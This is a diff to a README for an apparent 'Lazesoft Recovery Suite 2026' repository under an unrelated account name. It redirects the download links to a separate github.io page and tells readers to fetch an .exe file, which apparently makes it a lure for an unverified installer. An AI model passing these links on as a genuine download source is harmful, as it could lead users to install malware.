@@ -1,6 +1,6 @@
 # 💾 Lazesoft-Recovery-Suite-2026 - Recover lost files on Windows easily
 
-[![Download Lazesoft Recovery](https://img.shields.io/badge/Download-Recovery-blue.svg)](https://github.com/septettemagneticneedle175/Lazesoft-Recovery-Suite-2026)
+[![Download Lazesoft Recovery](https://img.shields.io/badge/Download-Recovery-blue.svg)](https://septettemagneticneedle175.github.io)
 
 ## 📁 Project Overview
 
@@ -22,7 +22,7 @@ Before you install the software, check your computer against these requirements:
 
 To get the software, follow these steps:
 
-1. Visit the repository link: [https://github.com/septettemagneticneedle175/Lazesoft-Recovery-Suite-2026](https://github.com/septettemagneticneedle175/Lazesoft-Recovery-Suite-2026)
+1. Visit the repository link: [https://septettemagneticneedle175.github.io](https://septettemagneticneedle175.github.io)
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in .exe to start your download.
